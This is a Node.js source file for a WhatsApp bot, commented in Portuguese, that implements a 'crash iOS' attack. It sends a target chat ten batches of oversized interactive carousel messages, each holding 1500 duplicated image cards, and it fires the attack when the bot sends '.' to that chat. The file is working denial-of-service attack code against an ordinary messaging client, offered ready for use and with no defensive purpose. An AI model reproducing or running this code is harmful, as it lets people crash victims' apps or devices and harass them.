const {
  generateWAMessageFromContent,
  proto
} = require("@angstvorfrauen/baileys");
const fs = require("fs");
const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail } = require("./database/mediaall.js");

// === FUNÇÃO PARA ENVIAR "." E DISPARAR O CRASH ===
async function sendDotToTriggerCrash(sock, targetJid) {
  const msg = generateWAMessageFromContent(
    targetJid,
    { conversation: "." },
    { userJid: sock.user.id }
  );
  await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
  console.log("✅ Ponto '.' enviado para:", targetJid);
}

// === FUNÇÃO DE CRASH iOS ===
async function crashIOS(sock, targetJid) {
  for (let i = 0; i < 10; i++) {
    const singleCard = {
      header: {
        title: ".",
        hasMediaAttachment: true,
        imageMessage: {
          url: url,
          mimetype: "image/jpeg",
          caption: ".",
          fileSha256: fileSha256,
          fileLength: "10",
          height: 1000,
          width: 1000,
          mediaKey: mediaKey,
          fileEncSha256: fileEncSha256,
          directPath: directPath,
          jpegThumbnail: jpegThumbnail,
        }
      },
      body: { text: "." },
      footer: { text: "." },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "x",
              url: "https://google.com",
              merchant_url: "https://google.com"
            })
          }
        ]
      }
    };

    console.log(`⏳ Enviando lote ${i + 1}/10...`);
    const card = Array(1500).fill(singleCard);

    const interactiveMsg = generateWAMessageFromContent(
      targetJid,
      {
        interactiveMessage: {
          body: { text: "." },
          carouselMessage: { cards: card }
        }
      },
      {}
    );

    await sock.relayMessage(targetJid, interactiveMsg.message, {
      messageId: interactiveMsg.key.id
    });

    await new Promise(r => setTimeout(r, 800)); // evita flood
  }
  console.log("✅ Crash iOS concluído para:", targetJid);
}

// === EXPORTA AS DUAS FUNÇÕES ===
module.exports.sendDotToTriggerCrash = sendDotToTriggerCrash;
module.exports.crashIOS = crashIOS;

// === PROCESSADOR DE MENSAGENS ===
module.exports = async (sock, m, chatUpdate) => {
  if (!m.message) return;
  if (m.key.remoteJid === "status@broadcast") return;
  if (m.key.id?.startsWith("BAE5")) return;

  const from = m.key.remoteJid;
  const isBot = m.key.fromMe; // CORRETO: mensagem enviada pelo próprio bot
  const text = (m.message.conversation || m.message.extendedTextMessage?.text || "").trim();

  // === DISPARA CRASH SE RECEBER "." DO PRÓPRIO BOT ===
  if (isBot && text === ".") {
    console.log("⚡ Ponto '.' recebido do bot → ativando crash iOS em", from);
    await crashIOS(sock, from);
    return;
  }

  // === PREFIXO E COMANDO ===
  const prefix = ".";
  const isCmd = text.startsWith(prefix);
  const command = isCmd ? text.slice(prefix.length).trim().split(" ")[0].toLowerCase() : "";

  // === COMANDO VAZIO: "." (mesmo efeito do ponto acima, mas via comando) ===
  if (isCmd && command === "") {
    if (!isBot) return; // só o bot pode ativar
    await crashIOS(sock, from);
  }
};

// === HOT RELOAD ===
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log("♻️ main.js recarregado");
  delete require.cache[file];
  require(file);
});
